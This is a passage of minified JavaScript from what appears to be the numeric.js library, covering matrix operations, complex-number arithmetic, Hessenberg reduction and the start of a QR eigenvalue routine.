h=(o<<16)+i,m.push(h>>24&255),m.push(h>>16&255),m.push(h>>8&255),m.push(255&h),s=m.length-41,m[33]=s>>24&255,m[34]=s>>16&255,m[35]=s>>8&255,m[36]=255&s,d=n(m,37),m.push(d>>24&255),m.push(d>>16&255),m.push(d>>8&255),m.push(255&d),m.push(0),m.push(0),m.push(0),m.push(0),m.push(73),m.push(69),m.push(78),m.push(68),m.push(174),m.push(66),m.push(96),m.push(130),"data:image/png;base64,"+function e(t){var e,n,i,o,r,s,a,l,c=t.length,u="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h="";for(e=0;e<c;e+=3)r=(n=t[e])>>2,s=((3&n)<<4)+((i=t[e+1])>>4),a=((15&i)<<2)+((o=t[e+2])>>6),l=63&o,e+1>=c?a=l=64:e+2>=c&&(l=64),h+=u.charAt(r)+u.charAt(s)+u.charAt(a)+u.charAt(l);return h}(m)},numeric._dim=function(t){for(var e=[];"object"==typeof t;)e.push(t.length),t=t[0];return e},numeric.dim=function(t){var e;return"object"==typeof t?"object"==typeof(e=t[0])?"object"==typeof e[0]?numeric._dim(t):[t.length,e.length]:[t.length]:[]},numeric.mapreduce=function(t,e){return Function("x","accum","_s","_k",'if(typeof accum === "undefined") accum = '+e+';\nif(typeof x === "number") { var xi = x; '+t+'; return accum; }\nif(typeof _s === "undefined") _s = numeric.dim(x);\nif(typeof _k === "undefined") _k = 0;\nvar _n = _s[_k];\nvar i,xi;\nif(_k < _s.length-1) {\n    for(i=_n-1;i>=0;i--) {\n        accum = arguments.callee(x[i],accum,_s,_k+1);\n    }    return accum;\n}\nfor(i=_n-1;i>=1;i-=2) { \n    xi = x[i];\n    '+t+";\n    xi = x[i-1];\n    "+t+";\n}\nif(i === 0) {\n    xi = x[i];\n    "+t+"\n}\nreturn accum;")},numeric.mapreduce2=function(t,e){return Function("x","var n = x.length;\nvar i,xi;\n"+e+";\nfor(i=n-1;i!==-1;--i) { \n    xi = x[i];\n    "+t+";\n}\nreturn accum;")},numeric.same=function t(e,n){var i,o;if(e instanceof Array&&n instanceof Array){if((o=e.length)!==n.length)return!1;for(i=0;i<o;i++)if(e[i]!==n[i]){if("object"!=typeof e[i])return!1;if(!t(e[i],n[i]))return!1}return!0}return!1},numeric.rep=function(t,e,n){void 0===n&&(n=0);var i,o=t[n],r=Array(o);if(n===t.length-1){for(i=o-2;i>=0;i-=2)r[i+1]=e,r[i]=e;return-1===i&&(r[0]=e),r}for(i=o-1;i>=0;i--)r[i]=numeric.rep(t,e,n+1);return r},numeric.dotMMsmall=function(t,e){var n,i,o,r,s,a,l,c,u,h,d;for(r=t.length,s=e.length,a=e[0].length,l=Array(r),n=r-1;n>=0;n--){for(c=Array(a),u=t[n],o=a-1;o>=0;o--){for(h=u[s-1]*e[s-1][o],i=s-2;i>=1;i-=2)d=i-1,h+=u[i]*e[i][o]+u[d]*e[d][o];0===i&&(h+=u[0]*e[0][o]),c[o]=h}l[n]=c}return l},numeric._getCol=function(t,e,n){var i;for(i=t.length-1;i>0;--i)n[i]=t[i][e],n[--i]=t[i][e];0===i&&(n[0]=t[0][e])},numeric.dotMMbig=function(t,e){var n,i,o,r=numeric._getCol,s=e.length,a=Array(s),l=t.length,c=e[0].length,u=new Array(l),h=numeric.dotVV;for(--s,i=--l;-1!==i;--i)u[i]=Array(c);for(i=--c;-1!==i;--i)for(r(e,i,a),o=l;-1!==o;--o)n=t[o],u[o][i]=h(n,a);return u},numeric.dotMV=function(t,e){var n,i=t.length,o=(e.length,Array(i)),r=numeric.dotVV;for(n=i-1;n>=0;n--)o[n]=r(t[n],e);return o},numeric.dotVM=function(t,e){var n,i,o,r,s,a,l;for(o=t.length,r=e[0].length,s=Array(r),i=r-1;i>=0;i--){for(a=t[o-1]*e[o-1][i],n=o-2;n>=1;n-=2)l=n-1,a+=t[n]*e[n][i]+t[l]*e[l][i];0===n&&(a+=t[0]*e[0][i]),s[i]=a}return s},numeric.dotVV=function(t,e){var n,i,o=t.length,r=t[o-1]*e[o-1];for(n=o-2;n>=1;n-=2)i=n-1,r+=t[n]*e[n]+t[i]*e[i];return 0===n&&(r+=t[0]*e[0]),r},numeric.dot=function(t,e){var n=numeric.dim;switch(1e3*n(t).length+n(e).length){case 2002:return e.length<10?numeric.dotMMsmall(t,e):numeric.dotMMbig(t,e);case 2001:return numeric.dotMV(t,e);case 1002:return numeric.dotVM(t,e);case 1001:return numeric.dotVV(t,e);case 1e3:return numeric.mulVS(t,e);case 1:return numeric.mulSV(t,e);case 0:return t*e;default:throw new Error("numeric.dot only works on vectors and matrices")}},numeric.diag=function(t){var e,n,i,o,r=t.length,s=Array(r);for(e=r-1;e>=0;e--){for(o=Array(r),n=e+2,i=r-1;i>=n;i-=2)o[i]=0,o[i-1]=0;for(i>e&&(o[i]=0),o[e]=t[e],i=e-1;i>=1;i-=2)o[i]=0,o[i-1]=0;0===i&&(o[0]=0),s[e]=o}return s},numeric.getDiag=function(t){var e,n=Math.min(t.length,t[0].length),i=Array(n);for(e=n-1;e>=1;--e)i[e]=t[e][e],i[--e]=t[e][e];return 0===e&&(i[0]=t[0][0]),i},numeric.identity=function(t){return numeric.diag(numeric.rep([t],1))},numeric.pointwise=function(t,e,n){void 0===n&&(n="");var i,o,r=[],s=/\[i\]$/,a="",l=!1;for(i=0;i<t.length;i++)s.test(t[i])?a=o=t[i].substring(0,t[i].length-3):o=t[i],"ret"===o&&(l=!0),r.push(o);return r[t.length]="_s",r[t.length+1]="_k",r[t.length+2]='if(typeof _s === "undefined") _s = numeric.dim('+a+');\nif(typeof _k === "undefined") _k = 0;\nvar _n = _s[_k];\nvar i'+(l?"":", ret = Array(_n)")+";\nif(_k < _s.length-1) {\n    for(i=_n-1;i>=0;i--) ret[i] = arguments.callee("+t.join(",")+",_s,_k+1);\n    return ret;\n}\n"+n+"\nfor(i=_n-1;i!==-1;--i) {\n    "+e+"\n}\nreturn ret;",Function.apply(null,r)},numeric.pointwise2=function(t,e,n){void 0===n&&(n="");var i,o,r=[],s=/\[i\]$/,a="",l=!1;for(i=0;i<t.length;i++)s.test(t[i])?a=o=t[i].substring(0,t[i].length-3):o=t[i],"ret"===o&&(l=!0),r.push(o);return r[t.length]="var _n = "+a+".length;\nvar i"+(l?"":", ret = Array(_n)")+";\n"+n+"\nfor(i=_n-1;i!==-1;--i) {\n"+e+"\n}\nreturn ret;",Function.apply(null,r)},numeric._biforeach=function e(t,n,i,o,r){var s;if(o!==i.length-1)for(s=i[o]-1;s>=0;s--)e("object"==typeof t?t[s]:t,"object"==typeof n?n[s]:n,i,o+1,r);else r(t,n)},numeric._biforeach2=function n(t,e,i,o,r){if(o===i.length-1)return r(t,e);var s,a=i[o],l=Array(a);for(s=a-1;s>=0;--s)l[s]=n("object"==typeof t?t[s]:t,"object"==typeof e?e[s]:e,i,o+1,r);return l},numeric._foreach=function o(t,e,n,i){var r;if(n!==e.length-1)for(r=e[n]-1;r>=0;r--)o(t[r],e,n+1,i);else i(t)},numeric._foreach2=function r(t,e,n,i){if(n===e.length-1)return i(t);var o,s=e[n],a=Array(s);for(o=s-1;o>=0;o--)a[o]=r(t[o],e,n+1,i);return a},numeric.ops2={add:"+",sub:"-",mul:"*",div:"/",mod:"%",and:"&&",or:"||",eq:"===",neq:"!==",lt:"<",gt:">",leq:"<=",geq:">=",band:"&",bor:"|",bxor:"^",lshift:"<<",rshift:">>",rrshift:">>>"},numeric.opseq={addeq:"+=",subeq:"-=",muleq:"*=",diveq:"/=",modeq:"%=",lshifteq:"<<=",rshifteq:">>=",rrshifteq:">>>=",bandeq:"&=",boreq:"|=",bxoreq:"^="},numeric.mathfuns=["abs","acos","asin","atan","ceil","cos","exp","floor","log","round","sin","sqrt","tan","isNaN","isFinite"],numeric.mathfuns2=["atan2","pow","max","min"],numeric.ops1={neg:"-",not:"!",bnot:"~",clone:""},numeric.mapreducers={any:["if(xi) return true;","var accum = false;"],all:["if(!xi) return false;","var accum = true;"],sum:["accum += xi;","var accum = 0;"],prod:["accum *= xi;","var accum = 1;"],norm2Squared:["accum += xi*xi;","var accum = 0;"],norminf:["accum = max(accum,abs(xi));","var accum = 0, max = Math.max, abs = Math.abs;"],norm1:["accum += abs(xi)","var accum = 0, abs = Math.abs;"],sup:["accum = max(accum,xi);","var accum = -Infinity, max = Math.max;"],inf:["accum = min(accum,xi);","var accum = Infinity, min = Math.min;"]},function(){var t,e;for(t=0;t<numeric.mathfuns2.length;++t)e=numeric.mathfuns2[t],numeric.ops2[e]=e;for(t in numeric.ops2)if(numeric.ops2.hasOwnProperty(t)){e=numeric.ops2[t];var n,i,o="";-1!==numeric.myIndexOf.call(numeric.mathfuns2,t)?(o="var "+e+" = Math."+e+";\n",n=function(t,n,i){return t+" = "+e+"("+n+","+i+")"},i=function(t,n){return t+" = "+e+"("+t+","+n+")"}):(n=function(t,n,i){return t+" = "+n+" "+e+" "+i},i=numeric.opseq.hasOwnProperty(t+"eq")?function(t,n){return t+" "+e+"= "+n}:function(t,n){return t+" = "+t+" "+e+" "+n}),numeric[t+"VV"]=numeric.pointwise2(["x[i]","y[i]"],n("ret[i]","x[i]","y[i]"),o),numeric[t+"SV"]=numeric.pointwise2(["x","y[i]"],n("ret[i]","x","y[i]"),o),numeric[t+"VS"]=numeric.pointwise2(["x[i]","y"],n("ret[i]","x[i]","y"),o),numeric[t]=Function("var n = arguments.length, i, x = arguments[0], y;\nvar VV = numeric."+t+"VV, VS = numeric."+t+"VS, SV = numeric."+t+'SV;\nvar dim = numeric.dim;\nfor(i=1;i!==n;++i) { \n  y = arguments[i];\n  if(typeof x === "object") {\n      if(typeof y === "object") x = numeric._biforeach2(x,y,dim(x),0,VV);\n      else x = numeric._biforeach2(x,y,dim(x),0,VS);\n  } else if(typeof y === "object") x = numeric._biforeach2(x,y,dim(y),0,SV);\n  else '+i("x","y")+"\n}\nreturn x;\n"),numeric[e]=numeric[t],numeric[t+"eqV"]=numeric.pointwise2(["ret[i]","x[i]"],i("ret[i]","x[i]"),o),numeric[t+"eqS"]=numeric.pointwise2(["ret[i]","x"],i("ret[i]","x"),o),numeric[t+"eq"]=Function("var n = arguments.length, i, x = arguments[0], y;\nvar V = numeric."+t+"eqV, S = numeric."+t+'eqS\nvar s = numeric.dim(x);\nfor(i=1;i!==n;++i) { \n  y = arguments[i];\n  if(typeof y === "object") numeric._biforeach(x,y,s,0,V);\n  else numeric._biforeach(x,y,s,0,S);\n}\nreturn x;\n')}for(t=0;t<numeric.mathfuns2.length;++t)e=numeric.mathfuns2[t],delete numeric.ops2[e];for(t=0;t<numeric.mathfuns.length;++t)e=numeric.mathfuns[t],numeric.ops1[e]=e;for(t in numeric.ops1)numeric.ops1.hasOwnProperty(t)&&(o="",e=numeric.ops1[t],-1!==numeric.myIndexOf.call(numeric.mathfuns,t)&&Math.hasOwnProperty(e)&&(o="var "+e+" = Math."+e+";\n"),numeric[t+"eqV"]=numeric.pointwise2(["ret[i]"],"ret[i] = "+e+"(ret[i]);",o),numeric[t+"eq"]=Function("x",'if(typeof x !== "object") return '+e+"x\nvar i;\nvar V = numeric."+t+"eqV;\nvar s = numeric.dim(x);\nnumeric._foreach(x,s,0,V);\nreturn x;\n"),numeric[t+"V"]=numeric.pointwise2(["x[i]"],"ret[i] = "+e+"(x[i]);",o),numeric[t]=Function("x",'if(typeof x !== "object") return '+e+"(x)\nvar i;\nvar V = numeric."+t+"V;\nvar s = numeric.dim(x);\nreturn numeric._foreach2(x,s,0,V);\n"));for(t=0;t<numeric.mathfuns.length;++t)e=numeric.mathfuns[t],delete numeric.ops1[e];for(t in numeric.mapreducers)numeric.mapreducers.hasOwnProperty(t)&&(e=numeric.mapreducers[t],numeric[t+"V"]=numeric.mapreduce2(e[0],e[1]),numeric[t]=Function("x","s","k",e[1]+'if(typeof x !== "object") {    xi = x;\n'+e[0]+';\n    return accum;\n}if(typeof s === "undefined") s = numeric.dim(x);\nif(typeof k === "undefined") k = 0;\nif(k === s.length-1) return numeric.'+t+"V(x);\nvar xi;\nvar n = x.length, i;\nfor(i=n-1;i!==-1;--i) {\n   xi = arguments.callee(x[i]);\n"+e[0]+";\n}\nreturn accum;\n"))}(),numeric.truncVV=numeric.pointwise(["x[i]","y[i]"],"ret[i] = round(x[i]/y[i])*y[i];","var round = Math.round;"),numeric.truncVS=numeric.pointwise(["x[i]","y"],"ret[i] = round(x[i]/y)*y;","var round = Math.round;"),numeric.truncSV=numeric.pointwise(["x","y[i]"],"ret[i] = round(x/y[i])*y[i];","var round = Math.round;"),numeric.trunc=function(t,e){return"object"==typeof t?"object"==typeof e?numeric.truncVV(t,e):numeric.truncVS(t,e):"object"==typeof e?numeric.truncSV(t,e):Math.round(t/e)*e},numeric.inv=function(t){var e,n,i,o,r,s,a,l=numeric.dim(t),c=Math.abs,u=l[0],h=l[1],d=numeric.clone(t),p=numeric.identity(u);for(s=0;s<h;++s){var f=-1,m=-1;for(r=s;r!==u;++r)(a=c(d[r][s]))>m&&(f=r,m=a);for(n=d[f],d[f]=d[s],d[s]=n,o=p[f],p[f]=p[s],p[s]=o,t=n[s],a=s;a!==h;++a)n[a]/=t;for(a=h-1;-1!==a;--a)o[a]/=t;for(r=u-1;-1!==r;--r)if(r!==s){for(e=d[r],i=p[r],t=e[s],a=s+1;a!==h;++a)e[a]-=n[a]*t;for(a=h-1;a>0;--a)i[a]-=o[a]*t,i[--a]-=o[a]*t;0===a&&(i[0]-=o[0]*t)}}return p},numeric.det=function(t){var e=numeric.dim(t);if(2!==e.length||e[0]!==e[1])throw new Error("numeric: det() only works on square matrices");var n,i,o,r,s,a,l,c,u=e[0],h=1,d=numeric.clone(t);for(i=0;i<u-1;i++){for(o=i,n=i+1;n<u;n++)Math.abs(d[n][i])>Math.abs(d[o][i])&&(o=n);for(o!==i&&(l=d[o],d[o]=d[i],d[i]=l,h*=-1),r=d[i],n=i+1;n<u;n++){for(a=(s=d[n])[i]/r[i],o=i+1;o<u-1;o+=2)c=o+1,s[o]-=r[o]*a,s[c]-=r[c]*a;o!==u&&(s[o]-=r[o]*a)}if(0===r[i])return 0;h*=r[i]}return h*d[i][i]},numeric.transpose=function(t){var e,n,i,o,r,s=t.length,a=t[0].length,l=Array(a);for(n=0;n<a;n++)l[n]=Array(s);for(e=s-1;e>=1;e-=2){for(o=t[e],i=t[e-1],n=a-1;n>=1;--n)(r=l[n])[e]=o[n],r[e-1]=i[n],(r=l[--n])[e]=o[n],r[e-1]=i[n];0===n&&((r=l[0])[e]=o[0],r[e-1]=i[0])}if(0===e){for(i=t[0],n=a-1;n>=1;--n)l[n][0]=i[n],l[--n][0]=i[n];0===n&&(l[0][0]=i[0])}return l},numeric.negtranspose=function(t){var e,n,i,o,r,s=t.length,a=t[0].length,l=Array(a);for(n=0;n<a;n++)l[n]=Array(s);for(e=s-1;e>=1;e-=2){for(o=t[e],i=t[e-1],n=a-1;n>=1;--n)(r=l[n])[e]=-o[n],r[e-1]=-i[n],(r=l[--n])[e]=-o[n],r[e-1]=-i[n];0===n&&((r=l[0])[e]=-o[0],r[e-1]=-i[0])}if(0===e){for(i=t[0],n=a-1;n>=1;--n)l[n][0]=-i[n],l[--n][0]=-i[n];0===n&&(l[0][0]=-i[0])}return l},numeric._random=function s(t,e){var n,i,o=t[e],r=Array(o);if(e===t.length-1){for(i=Math.random,n=o-1;n>=1;n-=2)r[n]=i(),r[n-1]=i();return 0===n&&(r[0]=i()),r}for(n=o-1;n>=0;n--)r[n]=s(t,e+1);return r},numeric.random=function(t){return numeric._random(t,0)},numeric.norm2=function(t){return Math.sqrt(numeric.norm2Squared(t))},numeric.linspace=function(t,e,n){if(void 0===n&&(n=Math.max(Math.round(e-t)+1,1)),n<2)return 1===n?[t]:[];var i,o=Array(n);for(i=--n;i>=0;i--)o[i]=(i*e+(n-i)*t)/n;return o},numeric.getBlock=function(t,e,n){var o=numeric.dim(t);return function i(t,r){var s,a=e[r],l=n[r]-a,c=Array(l);if(r===o.length-1){for(s=l;s>=0;s--)c[s]=t[s+a];return c}for(s=l;s>=0;s--)c[s]=i(t[s+a],r+1);return c}(t,0)},numeric.setBlock=function(t,e,n,i){var r=numeric.dim(t);return function o(t,i,s){var a,l=e[s],c=n[s]-l;if(s===r.length-1)for(a=c;a>=0;a--)t[a+l]=i[a];for(a=c;a>=0;a--)o(t[a+l],i[a],s+1)}(t,i,0),t},numeric.getRange=function(t,e,n){var i,o,r,s,a=e.length,l=n.length,c=Array(a);for(i=a-1;-1!==i;--i)for(c[i]=Array(l),r=c[i],s=t[e[i]],o=l-1;-1!==o;--o)r[o]=s[n[o]];return c},numeric.blockMatrix=function(t){var e=numeric.dim(t);if(e.length<4)return numeric.blockMatrix([t]);var n,i,o,r,s,a=e[0],l=e[1];for(n=0,i=0,o=0;o<a;++o)n+=t[o][0].length;for(r=0;r<l;++r)i+=t[0][r][0].length;var c=Array(n);for(o=0;o<n;++o)c[o]=Array(i);var u,h,d,p,f,m=0;for(o=0;o<a;++o){for(u=i,r=l-1;-1!==r;--r)for(u-=(s=t[o][r])[0].length,d=s.length-1;-1!==d;--d)for(f=s[d],h=c[m+d],p=f.length-1;-1!==p;--p)h[u+p]=f[p];m+=t[o][0].length}return c},numeric.tensor=function(t,e){if("number"==typeof t||"number"==typeof e)return numeric.mul(t,e);var n=numeric.dim(t),i=numeric.dim(e);if(1!==n.length||1!==i.length)throw new Error("numeric: tensor product is only defined for vectors");var o,r,s,a,l=n[0],c=i[0],u=Array(l);for(r=l-1;r>=0;r--){for(o=Array(c),a=t[r],s=c-1;s>=3;--s)o[s]=a*e[s],o[--s]=a*e[s],o[--s]=a*e[s],o[--s]=a*e[s];for(;s>=0;)o[s]=a*e[s],--s;u[r]=o}return u},numeric.T=function(t,e){this.x=t,this.y=e},numeric.t=function(t,e){return new numeric.T(t,e)},numeric.Tbinop=function(t,e,n,i,o){var r;if(numeric.indexOf,"string"!=typeof o)for(r in o="",numeric)numeric.hasOwnProperty(r)&&(t.indexOf(r)>=0||e.indexOf(r)>=0||n.indexOf(r)>=0||i.indexOf(r)>=0)&&r.length>1&&(o+="var "+r+" = numeric."+r+";\n");return Function(["y"],"var x = this;\nif(!(y instanceof numeric.T)) { y = new numeric.T(y); }\n"+o+"\nif(x.y) {  if(y.y) {    return new numeric.T("+i+");\n  }\n  return new numeric.T("+n+");\n}\nif(y.y) {\n  return new numeric.T("+e+");\n}\nreturn new numeric.T("+t+");\n")},numeric.T.prototype.add=numeric.Tbinop("add(x.x,y.x)","add(x.x,y.x),y.y","add(x.x,y.x),x.y","add(x.x,y.x),add(x.y,y.y)"),numeric.T.prototype.sub=numeric.Tbinop("sub(x.x,y.x)","sub(x.x,y.x),neg(y.y)","sub(x.x,y.x),x.y","sub(x.x,y.x),sub(x.y,y.y)"),numeric.T.prototype.mul=numeric.Tbinop("mul(x.x,y.x)","mul(x.x,y.x),mul(x.x,y.y)","mul(x.x,y.x),mul(x.y,y.x)","sub(mul(x.x,y.x),mul(x.y,y.y)),add(mul(x.x,y.y),mul(x.y,y.x))"),numeric.T.prototype.reciprocal=function(){var t=numeric.mul,e=numeric.div;if(this.y){var n=numeric.add(t(this.x,this.x),t(this.y,this.y));return new numeric.T(e(this.x,n),e(numeric.neg(this.y),n))}return new T(e(1,this.x))},numeric.T.prototype.div=function(t){if(t instanceof numeric.T||(t=new numeric.T(t)),t.y)return this.mul(t.reciprocal());var e=numeric.div;return this.y?new numeric.T(e(this.x,t.x),e(this.y,t.x)):new numeric.T(e(this.x,t.x))},numeric.T.prototype.dot=numeric.Tbinop("dot(x.x,y.x)","dot(x.x,y.x),dot(x.x,y.y)","dot(x.x,y.x),dot(x.y,y.x)","sub(dot(x.x,y.x),dot(x.y,y.y)),add(dot(x.x,y.y),dot(x.y,y.x))"),numeric.T.prototype.transpose=function(){var t=numeric.transpose,e=this.x,n=this.y;return n?new numeric.T(t(e),t(n)):new numeric.T(t(e))},numeric.T.prototype.transjugate=function(){var t=numeric.transpose,e=this.x,n=this.y;return n?new numeric.T(t(e),numeric.negtranspose(n)):new numeric.T(t(e))},numeric.Tunop=function(t,e,n){return"string"!=typeof n&&(n=""),Function("var x = this;\n"+n+"\nif(x.y) {  "+e+";\n}\n"+t+";\n")},numeric.T.prototype.exp=numeric.Tunop("return new numeric.T(ex)","return new numeric.T(mul(cos(x.y),ex),mul(sin(x.y),ex))","var ex = numeric.exp(x.x), cos = numeric.cos, sin = numeric.sin, mul = numeric.mul;"),numeric.T.prototype.conj=numeric.Tunop("return new numeric.T(x.x);","return new numeric.T(x.x,numeric.neg(x.y));"),numeric.T.prototype.neg=numeric.Tunop("return new numeric.T(neg(x.x));","return new numeric.T(neg(x.x),neg(x.y));","var neg = numeric.neg;"),numeric.T.prototype.sin=numeric.Tunop("return new numeric.T(numeric.sin(x.x))","return x.exp().sub(x.neg().exp()).div(new numeric.T(0,2));"),numeric.T.prototype.cos=numeric.Tunop("return new numeric.T(numeric.cos(x.x))","return x.exp().add(x.neg().exp()).div(2);"),numeric.T.prototype.abs=numeric.Tunop("return new numeric.T(numeric.abs(x.x));","return new numeric.T(numeric.sqrt(numeric.add(mul(x.x,x.x),mul(x.y,x.y))));","var mul = numeric.mul;"),numeric.T.prototype.log=numeric.Tunop("return new numeric.T(numeric.log(x.x));","var theta = new numeric.T(numeric.atan2(x.y,x.x)), r = x.abs();\nreturn new numeric.T(numeric.log(r.x),theta.x);"),numeric.T.prototype.norm2=numeric.Tunop("return numeric.norm2(x.x);","var f = numeric.norm2Squared;\nreturn Math.sqrt(f(x.x)+f(x.y));"),numeric.T.prototype.inv=function(){var t=this;if(void 0===t.y)return new numeric.T(numeric.inv(t.x));var e,n,i,o,r,s,a,l,c,u,h,d,p,f,m,g,v,y,b=t.x.length,x=numeric.identity(b),w=numeric.rep([b,b],0),_=numeric.clone(t.x),k=numeric.clone(t.y);for(c=0;c<b;c++){for(d=(f=_[c][c])*f+(m=k[c][c])*m,h=c,u=c+1;u<b;u++)(p=(f=_[u][c])*f+(m=k[u][c])*m)>d&&(h=u,d=p);for(h!==c&&(y=_[c],_[c]=_[h],_[h]=y,y=k[c],k[c]=k[h],k[h]=y,y=x[c],x[c]=x[h],x[h]=y,y=w[c],w[c]=w[h],w[h]=y),e=_[c],n=k[c],r=x[c],s=w[c],f=e[c],m=n[c],u=c+1;u<b;u++)g=e[u],v=n[u],e[u]=(g*f+v*m)/d,n[u]=(v*f-g*m)/d;for(u=0;u<b;u++)g=r[u],v=s[u],r[u]=(g*f+v*m)/d,s[u]=(v*f-g*m)/d;for(u=c+1;u<b;u++){for(i=_[u],o=k[u],a=x[u],l=w[u],f=i[c],m=o[c],h=c+1;h<b;h++)g=e[h],v=n[h],i[h]-=g*f-v*m,o[h]-=v*f+g*m;for(h=0;h<b;h++)g=r[h],v=s[h],a[h]-=g*f-v*m,l[h]-=v*f+g*m}}for(c=b-1;c>0;c--)for(r=x[c],s=w[c],u=c-1;u>=0;u--)for(a=x[u],l=w[u],f=_[u][c],m=k[u][c],h=b-1;h>=0;h--)g=r[h],v=s[h],a[h]-=f*g-m*v,l[h]-=f*v+m*g;return new numeric.T(x,w)},numeric.T.prototype.get=function(t){var e,n=this.x,i=this.y,o=0,r=t.length;if(i){for(;o<r;)n=n[e=t[o]],i=i[e],o++;return new numeric.T(n,i)}for(;o<r;)n=n[e=t[o]],o++;return new numeric.T(n)},numeric.T.prototype.set=function(t,e){var n,i=this.x,o=this.y,r=0,s=t.length,a=e.x,l=e.y;if(0===s)return l?this.y=l:o&&(this.y=void 0),this.x=i,this;if(l){for(o||(o=numeric.rep(numeric.dim(i),0),this.y=o);r<s-1;)i=i[n=t[r]],o=o[n],r++;return i[n=t[r]]=a,o[n]=l,this}if(o){for(;r<s-1;)i=i[n=t[r]],o=o[n],r++;return i[n=t[r]]=a,o[n]=a instanceof Array?numeric.rep(numeric.dim(a),0):0,this}for(;r<s-1;)i=i[n=t[r]],r++;return i[n=t[r]]=a,this},numeric.T.prototype.getRows=function(t,e){var n,i,o=e-t+1,r=Array(o),s=this.x,a=this.y;for(n=t;n<=e;n++)r[n-t]=s[n];if(a){for(i=Array(o),n=t;n<=e;n++)i[n-t]=a[n];return new numeric.T(r,i)}return new numeric.T(r)},numeric.T.prototype.setRows=function(t,e,n){var i,o=this.x,r=this.y,s=n.x,a=n.y;for(i=t;i<=e;i++)o[i]=s[i-t];if(a)for(r||(r=numeric.rep(numeric.dim(o),0),this.y=r),i=t;i<=e;i++)r[i]=a[i-t];else if(r)for(i=t;i<=e;i++)r[i]=numeric.rep([s[i-t].length],0);return this},numeric.T.prototype.getRow=function(t){var e=this.x,n=this.y;return n?new numeric.T(e[t],n[t]):new numeric.T(e[t])},numeric.T.prototype.setRow=function(t,e){var n=this.x,i=this.y,o=e.x,r=e.y;return n[t]=o,r?(i||(i=numeric.rep(numeric.dim(n),0),this.y=i),i[t]=r):i&&(i=numeric.rep([o.length],0)),this},numeric.T.prototype.getBlock=function(t,e){var n=this.x,i=this.y,o=numeric.getBlock;return i?new numeric.T(o(n,t,e),o(i,t,e)):new numeric.T(o(n,t,e))},numeric.T.prototype.setBlock=function(t,e,n){n instanceof numeric.T||(n=new numeric.T(n));var i=this.x,o=this.y,r=numeric.setBlock,s=n.x,a=n.y;if(a)return o||(this.y=numeric.rep(numeric.dim(this),0),o=this.y),r(i,t,e,s),r(o,t,e,a),this;r(i,t,e,s),o&&r(o,t,e,numeric.rep(numeric.dim(s),0))},numeric.T.rep=function(t,e){var n=numeric.T;e instanceof n||(e=new n(e));var i=e.x,o=e.y,r=numeric.rep;return o?new n(r(t,i),r(t,o)):new n(r(t,i))},numeric.T.diag=function(t){t instanceof numeric.T||(t=new numeric.T(t));var e=t.x,n=t.y,i=numeric.diag;return n?new numeric.T(i(e),i(n)):new numeric.T(i(e))},numeric.T.eig=function(){if(this.y)throw new Error("eig: not implemented for complex matrices.");return numeric.eig(this.x)},numeric.T.identity=function(t){return new numeric.T(numeric.identity(t))},numeric.T.prototype.getDiag=function(){var t=numeric,e=this.x,n=this.y;return n?new t.T(t.getDiag(e),t.getDiag(n)):new t.T(t.getDiag(e))},numeric.house=function(t){var e=numeric.clone(t),n=(t[0]>=0?1:-1)*numeric.norm2(t);e[0]+=n;var i=numeric.norm2(e);if(0===i)throw new Error("eig: internal error");return numeric.div(e,i)},numeric.toUpperHessenberg=function(t){var e=numeric.dim(t);if(2!==e.length||e[0]!==e[1])throw new Error("numeric: toUpperHessenberg() only works on square matrices");var n,i,o,r,s,a,l,c,u,h,d=e[0],p=numeric.clone(t),f=numeric.identity(d);for(i=0;i<d-2;i++){for(r=Array(d-i-1),n=i+1;n<d;n++)r[n-i-1]=p[n][i];if(numeric.norm2(r)>0){for(s=numeric.house(r),a=numeric.getBlock(p,[i+1,i],[d-1,d-1]),l=numeric.tensor(s,numeric.dot(s,a)),n=i+1;n<d;n++)for(c=p[n],u=l[n-i-1],o=i;o<d;o++)c[o]-=2*u[o-i];for(a=numeric.getBlock(p,[0,i+1],[d-1,d-1]),l=numeric.tensor(numeric.dot(a,s),s),n=0;n<d;n++)for(c=p[n],u=l[n],o=i+1;o<d;o++)c[o]-=2*u[o-i-1];for(a=Array(d-i-1),n=i+1;n<d;n++)a[n-i-1]=f[n];for(l=numeric.tensor(s,numeric.dot(s,a)),n=i+1;n<d;n++)for(h=f[n],u=l[n-i-1],o=0;o<d;o++)h[o]-=2*u[o]}}return{H:p,Q:f}},numeric.epsilon=2220446049250313e-31,numeric.QRFrancis=function(t,e){void 0===e&&(e=1e4),t=numeric.clone(t),numeric.clone(t);var n,i,o,r,s,a,l,c,u,h,d,p,f,m,g,v,y,b,x=numeric.dim(t)[0],w=numeric.identity(x);if(x<3)return{Q:w,B:[[0,x-1]]};var _=numeric.epsilon;for(b=0;b<e;b++){for(v=0;v<x-1;v++)if(Math.abs(t[v+1][v])<_*(Math.abs(t[v][v])+Math.abs(t[v+1][v+1]))){var k=numeric.QRFrancis(numeric.getBlock(t,[0,0],[v,v]),e),T=numeric.QRFrancis(numeric.getBlock(t,[v+1,v+1],[x-1,x-1]),e);for(p=Array(v+1),g=0;g<=v;g++)p[g]=w[g];for(f=numeric.dot(k.Q,p),g=0;g<=v;g++)w[g]=f[g];for(p=Array(x-v-1),g=v+1;g<x;g++)p[g-v-1]=w[g];for(f=numeric.dot(T.Q,p),g=v+1;g<x;g++)w[g]=f[g-v-1];return{Q:w,B:k.B.concat(numeric.add(T.B,v+1))}}var C,S,E;for(o=t[x-2][x-2],r=t[x-2][x-1],s=t[x-1][x-2],c=o+(a=t[x-1][x-1]),l=o*a-r*s,u=numeric.getBlock(t,[0,0],[2,2]),c*c>=4*l?(C=.5*(c+Math.sqrt(c*c-4*l)),S=.5*(c-Math.sqrt(c*c-4*l)),u=numeric.add(numeric.sub(numeric.dot(u,u),numeric.mul(u,C+S)),numeric.diag(numeric.rep([3],C*S)))):u=numeric.add(numeric.sub(numeric.dot(u,u),numeric.mul(u,c)),numeric.diag(numeric.rep([3],l))),n=[u[0][0],u[1][0],u[2][0]],i=numeric.house(n),p=[t[0],t[1],t[2]],f=numeric.tensor(i,numeric.dot(i,p)),g=0;g<3;g++)for(d=t[g],m=f[g],y=0;y<x;y++)d[y]-=2*m[y];for(p=numeric.getBlock(t,[0,0],[x-1,2]),f=numeric.tensor(numeric.dot(p,i),i),g=0;g<x;g++)for(d=t[g],m=f[g],y=0;y<3;y++)d[y]-=2*m[y];for(p=[w[0],w[1],w[2]],f=numeric.tensor(i,numeric.dot(i,p)),g=0;g<3;g++)for(h=w[g],m=f[g],y=0;y<x;y++)h[y]-=2*m[y];for(v=0;v<x-2